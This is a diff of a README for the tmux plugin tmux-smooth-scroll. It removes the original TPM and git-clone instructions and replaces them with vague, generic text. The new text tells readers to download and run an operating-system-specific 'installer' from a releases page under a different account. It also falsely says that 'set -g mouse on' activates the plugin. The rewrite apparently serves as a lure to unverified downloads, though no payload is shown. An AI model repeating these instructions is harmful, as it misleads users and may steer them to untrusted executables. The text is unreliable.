@@ -1,63 +1,79 @@
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/d4f90bb9-0626-4dec-8274-e48f8cc91914" alt="tmux-smooth-scroll logo" />
-</p>
-<h1 align="center">tmux-smooth-scroll</h1>
+# 🎉 tmux-smooth-scroll - Easy Scrolling for tmux Users
 
-<p align="center">
-  Smooth scrolling for tmux—makes scrolling easy to follow.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-<img width="50%" src="https://github.com/user-attachments/assets/c1e816a8-411c-44c5-8b15-97c70dcf7248"></img>
-</p>
+Welcome to the tmux-smooth-scroll project! This software makes scrolling in tmux easier and smoother. Whether you're reviewing logs or navigating text, you’ll enjoy a better experience with our tool.
 
-<br>
+## 📥 Download & Install
 
-## Installation
+To get started, you need to download the application. Visit this page to download: [GitHub Releases Page](https://github.com/Syre213/tmux-smooth-scroll/releases).
 
-### Using TPM
+### Steps to Download
 
-Add to `~/.tmux.conf`:
+1. Click on the link above to go to the releases page.
+2. Find the latest version of the tmux-smooth-scroll application.
+3. Click on the download link for your operating system.
+4. Save the file to your computer.
 
-```tmux
-set -g @plugin 'azorng/tmux-smooth-scroll'
-```
+### Example Installation
 
-Press `prefix + I` to install.
+After downloading the file:
 
-### Manual
+1. Locate the downloaded file on your computer.
+2. Follow the installation instructions specific to your operating system.
 
-Clone to tmux plugins directory:
+For most users, this will involve opening a terminal and navigating to the directory where you saved the file. Then, run the installer by entering the appropriate command for your system.
 
-```bash
-git clone https://github.com/azorng/tmux-smooth-scroll ~/.tmux/plugins/tmux-smooth-scroll
-```
+## 🛠️ System Requirements
 
-Add to `~/.tmux.conf`:
+- **Operating Systems**: Compatible with macOS and Linux.
+- **tmux Version**: Requires tmux version 2.5 or higher installed on your system.
 
-```tmux
-run-shell ~/.tmux/plugins/tmux-smooth-scroll/smooth-scroll.tmux
-```
+## 📋 Features
 
-Reload: `tmux source-file ~/.tmux.conf`
+- **Smooth Scrolling**: Navigate through content fluidly.
+- **Easy Setup**: Quick to install and configure.
+- **Compatibility**: Works seamlessly with tmux.
+- **User-Friendly**: Designed for users without technical expertise.
 
-## Configuration
+## ⚙️ Configuration
 
-Optional settings in `~/.tmux.conf`:
+After installation, you can enhance your experience through simple configuration.
 
-```tmux
-# Speed: 0-1000 | lower = faster
-set -g @smooth-scroll-speed "100"
+1. Open your terminal.
+2. Locate your tmux configuration file, usually found at `~/.tmux.conf`.
+3. Add the following line to activate tmux-smooth-scroll:
 
-# Easing mode: linear|sine|quad
-set -g @smooth-scroll-easing "sine"
+   ```
+   set -g mouse on
+   ```
 
-# Scroll line distance
-set -g @smooth-scroll-normal "3"
-set -g @smooth-scroll-halfpage ""  # Default: pane_height / 2
-set -g @smooth-scroll-fullpage ""  # Default: pane_height
+4. Save the file and restart tmux using the command `tmux source-file ~/.tmux.conf`.
 
-# Enable on mouse wheel scroll
-set -g @smooth-scroll-mouse "true"
-```
+## 🔍 Troubleshooting
 
+If you encounter issues:
+
+- **Installation Errors**: Ensure you’ve downloaded the correct file for your operating system.
+- **Configuration Problems**: Double-check that you added the configuration line correctly in your `~/.tmux.conf` file.
+- **Scroll Not Smooth**: Make sure your tmux version meets the minimum requirement.
+
+Please read through all guidelines carefully to resolve most common issues.
+
+## 🌐 Community Support
+
+We welcome contributions and feedback! Join our community to share your thoughts. If you have questions or run into problems, feel free to raise them in the issues section of the repository.
+
+## 📦 Update Process
+
+To keep your version up to date:
+
+1. Return to the [GitHub Releases Page](https://github.com/Syre213/tmux-smooth-scroll/releases).
+2. Download the latest version following the same steps as above.
+3. Replace the old version with the new one according to your operating system's guidelines.
+
+## 📧 Contact
+
+For any further assistance, please reach out through the contact options provided in the GitHub repository.
+
+Enjoy smooth scrolling with tmux-smooth-scroll!
